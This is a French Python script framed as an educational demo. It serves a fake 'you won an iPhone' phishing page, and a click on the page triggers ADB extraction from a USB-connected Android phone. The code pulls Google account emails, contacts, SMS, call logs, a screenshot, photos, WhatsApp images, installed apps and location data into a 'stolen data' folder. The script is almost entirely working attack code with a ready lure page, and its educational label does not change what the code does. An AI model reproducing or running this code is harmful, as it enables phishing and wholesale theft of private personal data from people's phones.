#!/usr/bin/env python3
"""
🔴 SERVEUR D'EXTRACTION DE DONNÉES - DÉMONSTRATION ÉDUCATIVE
=============================================================
Ce serveur simule une attaque où un lien piégé déclenche
l'extraction complète des données du téléphone.

⚠️ USAGE ÉDUCATIF UNIQUEMENT - SUR TON PROPRE APPAREIL
"""

import http.server
import socketserver
import subprocess
import os
import json
import threading
import time
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import socket

# Configuration
PORT = 8888
ADB = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
OUTPUT_DIR = r"C:\Users\davis\OneDrive\Bureau\HACKING\DONNEES_VOLEES_LIEN"

# Obtenir l'IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

LOCAL_IP = get_local_ip()

def run_adb(cmd):
    """Exécuter une commande ADB"""
    try:
        result = subprocess.run(f'"{ADB}" {cmd}', shell=True, capture_output=True, 
                               text=True, timeout=60, encoding='utf-8', errors='replace')
        return result.stdout.strip()
    except:
        return ""

def extract_all_data():
    """Extraire toutes les données du téléphone"""
    print("\n" + "="*60)
    print("🔴 EXTRACTION DÉCLENCHÉE PAR LE LIEN!")
    print("="*60 + "\n")
    
    # Créer les dossiers
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in ["Photos", "Screenshots", "Contacts", "SMS", "WhatsApp"]:
        os.makedirs(f"{OUTPUT_DIR}/{folder}", exist_ok=True)
    
    extraction_log = []
    extraction_log.append(f"Extraction démarrée: {datetime.now()}")
    
    # 1. Infos système
    print("📱 [1/10] Extraction infos système...")
    model = run_adb("shell getprop ro.product.model")
    android = run_adb("shell getprop ro.build.version.release")
    serial = run_adb("shell getprop ro.serialno")
    
    system_info = {
        "model": model,
        "android": android,
        "serial": serial,
        "extraction_date": str(datetime.now())
    }
    
    with open(f"{OUTPUT_DIR}/system_info.json", "w") as f:
        json.dump(system_info, f, indent=2)
    extraction_log.append(f"✅ Infos système: {model}")
    print(f"   ✅ {model} - Android {android}")
    
    # 2. Comptes Google
    print("📧 [2/10] Extraction comptes Google...")
    accounts = run_adb("shell dumpsys account")
    google_emails = []
    for line in accounts.split("\n"):
        if "Account {" in line and "type=com.google" in line:
            start = line.find("name=") + 5
            end = line.find(",", start)
            if end > start:
                email = line[start:end]
                if "@" in email and email not in google_emails:
                    google_emails.append(email)
                    print(f"   📧 {email}")
    
    with open(f"{OUTPUT_DIR}/comptes_google.txt", "w") as f:
        f.write("\n".join(google_emails))
    extraction_log.append(f"✅ Comptes Google: {len(google_emails)}")
    
    # 3. Contacts
    print("📇 [3/10] Extraction contacts...")
    contacts = run_adb("shell content query --uri content://contacts/phones")
    contact_count = contacts.count("Row:")
    
    with open(f"{OUTPUT_DIR}/Contacts/contacts.txt", "w", encoding="utf-8") as f:
        f.write(contacts)
    extraction_log.append(f"✅ Contacts: {contact_count}")
    print(f"   ✅ {contact_count} contacts extraits")
    
    # 4. SMS
    print("💬 [4/10] Extraction SMS...")
    sms = run_adb("shell content query --uri content://sms")
    sms_count = sms.count("Row:")
    
    with open(f"{OUTPUT_DIR}/SMS/sms.txt", "w", encoding="utf-8") as f:
        f.write(sms)
    extraction_log.append(f"✅ SMS: {sms_count}")
    print(f"   ✅ {sms_count} SMS extraits")
    
    # 5. Historique appels
    print("📞 [5/10] Extraction historique appels...")
    calls = run_adb("shell content query --uri content://call_log/calls")
    calls_count = calls.count("Row:")
    
    with open(f"{OUTPUT_DIR}/historique_appels.txt", "w", encoding="utf-8") as f:
        f.write(calls)
    extraction_log.append(f"✅ Appels: {calls_count}")
    print(f"   ✅ {calls_count} appels extraits")
    
    # 6. Screenshot actuel
    print("📸 [6/10] Capture d'écran...")
    run_adb("shell screencap -p /sdcard/stolen.png")
    run_adb(f'pull /sdcard/stolen.png "{OUTPUT_DIR}/Screenshots/ecran_vole.png"')
    run_adb("shell rm /sdcard/stolen.png")
    print("   ✅ Screenshot capturé")
    extraction_log.append("✅ Screenshot capturé")
    
    # 7. Photos récentes
    print("📷 [7/10] Téléchargement photos...")
    photos = run_adb("shell ls -t /sdcard/DCIM/Camera/ 2>/dev/null | head -5")
    photo_count = 0
    for photo in photos.split("\n"):
        if photo.strip() and (".jpg" in photo.lower() or ".png" in photo.lower()):
            run_adb(f'pull "/sdcard/DCIM/Camera/{photo.strip()}" "{OUTPUT_DIR}/Photos/{photo.strip()}"')
            photo_count += 1
            print(f"   📷 {photo.strip()}")
    extraction_log.append(f"✅ Photos: {photo_count}")
    
    # 8. WhatsApp
    print("📱 [8/10] Extraction WhatsApp...")
    wa_path = "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"
    wa_images = run_adb(f'shell ls "{wa_path}" 2>/dev/null | head -5')
    wa_count = 0
    for img in wa_images.split("\n"):
        if img.strip() and ".jpg" in img.lower():
            run_adb(f'pull "{wa_path}/{img.strip()}" "{OUTPUT_DIR}/WhatsApp/{img.strip()}"')
            wa_count += 1
    print(f"   ✅ {wa_count} images WhatsApp")
    extraction_log.append(f"✅ WhatsApp: {wa_count} images")
    
    # 9. Applications
    print("📲 [9/10] Liste applications...")
    apps = run_adb("shell pm list packages -3")
    app_list = [l.replace("package:", "") for l in apps.split("\n") if "package:" in l]
    
    with open(f"{OUTPUT_DIR}/applications.txt", "w") as f:
        f.write("\n".join(app_list))
    extraction_log.append(f"✅ Applications: {len(app_list)}")
    print(f"   ✅ {len(app_list)} applications")
    
    # 10. Localisation
    print("📍 [10/10] Localisation...")
    location = run_adb("shell dumpsys location")
    with open(f"{OUTPUT_DIR}/localisation.txt", "w", encoding="utf-8") as f:
        f.write(location)
    extraction_log.append("✅ Localisation extraite")
    print("   ✅ Données GPS extraites")
    
    # Rapport final
    print("\n" + "="*60)
    print("🔴 EXTRACTION TERMINÉE!")
    print("="*60)
    
    # Compter les fichiers
    total_files = sum([len(files) for _, _, files in os.walk(OUTPUT_DIR)])
    total_size = sum([os.path.getsize(os.path.join(root, f)) 
                      for root, _, files in os.walk(OUTPUT_DIR) for f in files])
    
    report = f"""
╔══════════════════════════════════════════════════════════════╗
║           🔴 DONNÉES VOLÉES VIA LIEN PIÉGÉ 🔴                ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📱 Téléphone: {model:<43}║
║   📧 Comptes Google: {len(google_emails):<38}║
║   📇 Contacts: {contact_count:<44}║
║   💬 SMS: {sms_count:<49}║
║   📞 Appels: {calls_count:<46}║
║   📷 Photos: {photo_count:<46}║
║   📱 WhatsApp: {wa_count:<44}║
║   📲 Applications: {len(app_list):<40}║
║                                                              ║
║   💾 Total fichiers: {total_files:<38}║
║   📁 Taille: {total_size:,} bytes{' '*30}║
║                                                              ║
║   📂 Dossier: {OUTPUT_DIR[:44]}║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(report)
    
    # Sauvegarder le log
    with open(f"{OUTPUT_DIR}/extraction_log.txt", "w") as f:
        f.write("\n".join(extraction_log))
        f.write(report)
    
    # Ouvrir le dossier
    os.startfile(OUTPUT_DIR)
    
    return {
        "model": model,
        "emails": google_emails,
        "contacts": contact_count,
        "sms": sms_count,
        "calls": calls_count,
        "photos": photo_count,
        "apps": len(app_list),
        "total_files": total_files,
        "total_size": total_size
    }


# Page HTML du lien piégé
TRAP_PAGE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Félicitations! Vous avez gagné!</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: popup 0.5s ease;
        }}
        @keyframes popup {{
            from {{ transform: scale(0.8); opacity: 0; }}
            to {{ transform: scale(1); opacity: 1; }}
        }}
        .gift {{ font-size: 80px; margin-bottom: 20px; }}
        h1 {{ color: #333; margin-bottom: 15px; }}
        .prize {{ 
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 28px;
            font-weight: bold;
            margin: 20px 0;
        }}
        p {{ color: #666; margin-bottom: 20px; line-height: 1.6; }}
        .btn {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 50px;
            font-size: 18px;
            border-radius: 30px;
            cursor: pointer;
            transition: transform 0.3s;
            text-decoration: none;
            display: inline-block;
        }}
        .btn:hover {{ transform: scale(1.05); }}
        .timer {{
            background: #ff4757;
            color: white;
            padding: 10px 20px;
            border-radius: 20px;
            margin: 20px 0;
            font-weight: bold;
        }}
        .loading {{
            display: none;
            margin-top: 20px;
        }}
        .loading.show {{ display: block; }}
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .success {{
            display: none;
            color: #2ed573;
            font-size: 60px;
            margin: 20px 0;
        }}
        .success.show {{ display: block; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="gift">🎁</div>
        <h1>Félicitations!</h1>
        <div class="prize">Vous avez gagné un iPhone 15 Pro!</div>
        <div class="timer">⏰ Offre expire dans: <span id="timer">02:00</span></div>
        <p>Vous êtes le visiteur n°1,000,000! Cliquez sur le bouton ci-dessous pour réclamer votre prix exclusif!</p>
        
        <a href="/claim" class="btn" id="claimBtn" onclick="claimPrize(event)">
            🎉 RÉCLAMER MON PRIX
        </a>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Vérification en cours...</p>
        </div>
        
        <div class="success" id="success">✅</div>
        <p id="successMsg" style="display:none; color: #2ed573; font-weight: bold;">
            Prix réclamé avec succès!
        </p>
    </div>
    
    <script>
        // Timer countdown
        let time = 120;
        setInterval(() => {{
            time--;
            const mins = Math.floor(time / 60);
            const secs = time % 60;
            document.getElementById('timer').textContent = 
                `${{mins.toString().padStart(2, '0')}}:${{secs.toString().padStart(2, '0')}}`;
        }}, 1000);
        
        function claimPrize(e) {{
            e.preventDefault();
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').classList.add('show');
            
            // Envoyer la requête qui déclenche l'extraction
            fetch('/trigger-extraction')
                .then(response => response.json())
                .then(data => {{
                    document.getElementById('loading').classList.remove('show');
                    document.getElementById('success').classList.add('show');
                    document.getElementById('successMsg').style.display = 'block';
                }});
        }}
    </script>
</body>
</html>
"""

# Page de succès après extraction
SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Extraction réussie</title>
    <style>
        body { 
            font-family: Arial; 
            background: #1a1a2e; 
            color: white; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #16213e;
            padding: 40px;
            border-radius: 20px;
            max-width: 600px;
        }
        h1 { color: #e94560; }
        .stats { 
            background: #0f3460; 
            padding: 20px; 
            border-radius: 10px; 
            margin: 20px 0;
            text-align: left;
        }
        .stat { margin: 10px 0; }
        .warning {
            background: #e94560;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔴 DONNÉES EXTRAITES!</h1>
        <p>Voici ce qui a été volé de ton téléphone:</p>
        <div class="stats">
            <div class="stat">📱 Modèle: {model}</div>
            <div class="stat">📧 Comptes Google: {emails}</div>
            <div class="stat">📇 Contacts: {contacts}</div>
            <div class="stat">💬 SMS: {sms}</div>
            <div class="stat">📞 Appels: {calls}</div>
            <div class="stat">📷 Photos: {photos}</div>
            <div class="stat">📲 Applications: {apps}</div>
            <div class="stat">💾 Fichiers: {total_files}</div>
            <div class="stat">📁 Taille: {size} KB</div>
        </div>
        <div class="warning">
            ⚠️ LEÇON: Ne clique JAMAIS sur des liens suspects!<br>
            Un hacker peut voler toutes tes données en un clic!
        </div>
    </div>
</body>
</html>
"""

class TrapHandler(http.server.SimpleHTTPRequestHandler):
    extraction_result = None
    
    def do_GET(self):
        if self.path == "/" or self.path == "/trap":
            # Page piège
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(TRAP_PAGE.encode())
            print(f"🎯 Victime connectée depuis {self.client_address[0]}")
            
        elif self.path == "/trigger-extraction":
            # Déclencher l'extraction
            print("🔴 LIEN CLIQUÉ! EXTRACTION EN COURS...")
            TrapHandler.extraction_result = extract_all_data()
            
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
            
        elif self.path == "/result":
            # Page résultat
            if TrapHandler.extraction_result:
                r = TrapHandler.extraction_result
                html = SUCCESS_PAGE.format(
                    model=r.get('model', 'N/A'),
                    emails=len(r.get('emails', [])),
                    contacts=r.get('contacts', 0),
                    sms=r.get('sms', 0),
                    calls=r.get('calls', 0),
                    photos=r.get('photos', 0),
                    apps=r.get('apps', 0),
                    total_files=r.get('total_files', 0),
                    size=round(r.get('total_size', 0) / 1024, 1)
                )
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(html.encode())
            else:
                self.send_response(302)
                self.send_header("Location", "/")
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Silencieux

def send_link_to_phone():
    """Envoyer le lien piégé sur le téléphone via ADB"""
    link = f"http://{LOCAL_IP}:{PORT}/"
    
    print(f"\n📱 Envoi du lien piégé sur ton téléphone...")
    
    # Ouvrir le lien dans le navigateur du téléphone
    result = run_adb(f'shell am start -a android.intent.action.VIEW -d "{link}"')
    
    if "Error" not in result:
        print(f"   ✅ Lien ouvert sur le téléphone!")
        return True
    else:
        print(f"   ❌ Erreur: {result}")
        return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   🔴 SERVEUR D'EXTRACTION VIA LIEN PIÉGÉ                        ║
║                                                                  ║
║   Ce serveur simule une attaque de phishing qui extrait         ║
║   automatiquement les données quand la victime clique           ║
║                                                                  ║
║   ⚠️  USAGE ÉDUCATIF UNIQUEMENT                                  ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    # Vérifier connexion ADB
    devices = run_adb("devices")
    if "device" not in devices:
        print("❌ Aucun téléphone connecté!")
        print("   Connecte ton téléphone en USB avec le débogage activé")
        return
    
    print(f"✅ Téléphone connecté")
    print(f"\n🌐 Démarrage du serveur sur le port {PORT}...")
    
    with socketserver.TCPServer(("", PORT), TrapHandler) as httpd:
        print(f"✅ Serveur démarré!")
        print(f"\n" + "="*60)
        print(f"📱 LIEN PIÉGÉ: http://{LOCAL_IP}:{PORT}/")
        print(f"="*60)
        
        # Demander si on envoie automatiquement
        print(f"\n🎯 Envoi du lien sur ton téléphone dans 3 secondes...")
        time.sleep(3)
        send_link_to_phone()
        
        print(f"\n⏳ En attente du clic sur le lien...")
        print(f"   (Le serveur capture tout automatiquement)")
        print(f"\n   Appuie sur Ctrl+C pour arrêter\n")
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\n🛑 Serveur arrêté")

if __name__ == "__main__":
    main()
